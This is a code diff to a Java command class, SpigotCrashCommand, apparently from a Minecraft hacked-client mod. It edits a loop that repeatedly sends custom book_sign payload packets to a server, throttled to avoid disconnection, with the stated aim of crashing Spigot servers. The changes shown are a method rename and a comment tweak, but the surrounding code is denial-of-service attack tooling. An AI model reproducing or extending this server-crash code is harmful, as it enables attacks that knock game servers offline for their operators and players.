@@ -82,7 +82,7 @@ public class SpigotCrashCommand extends Command {
 
                         CustomPayload payloadObj = new CustomPayload() {
                             @Override
-                            public Identifier id() {
+                            public Identifier getId() {
                                 return Identifier.of("minecraft:book_sign"); // Replace with custom if needed
                             }
 
@@ -96,7 +96,7 @@ public class SpigotCrashCommand extends Command {
                         connection.sendPacket(packet);
                     }
 
-                    Thread.sleep(50); // Throttle to avoid instant disconnect
+                    Thread.sleep(50); // Throttle to avoid disconnect
                 }
             } catch (Exception e) {
                 Helper.printChatMessage("§cCrash error: " + e.getMessage());
